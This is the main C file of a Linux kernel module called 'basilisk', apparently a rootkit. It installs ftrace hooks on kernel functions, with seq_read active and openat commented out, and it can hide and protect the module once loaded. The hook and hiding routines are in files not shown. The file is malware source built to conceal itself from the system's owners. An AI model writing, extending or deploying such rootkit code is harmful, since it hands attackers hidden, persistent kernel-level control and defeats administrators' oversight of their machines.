#include "include/main.h"

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    // HOOK("sys_openat", hook_openat, &orig_openat, true), until issue #4 gets fixed
    HOOK("seq_read", hook_seq_read, &orig_seq_read, false),
};

/* Module initialization function */
static int __init basilisk_init(void) {
  int err;

  init_this_kobj(); // initialize this_kobj utility struct in stealth_helper.h
  /* Hook the syscall and print to the kernel buffer */
  err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  if (err)
    return err;

  pr_info("basilisk: loaded\n");
  #ifdef HIDE_LKM_ON_LOAD
    h_lkm_hide_and_protect();
  #endif

  return 0;
}

static void __exit basilisk_exit(void) {
  kfree(king_fops); // free king_fops
  /* Unhook and restore the syscalls */
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
  printk(KERN_INFO "basilisk: unloaded\n");
}

module_init(basilisk_init);
module_exit(basilisk_exit);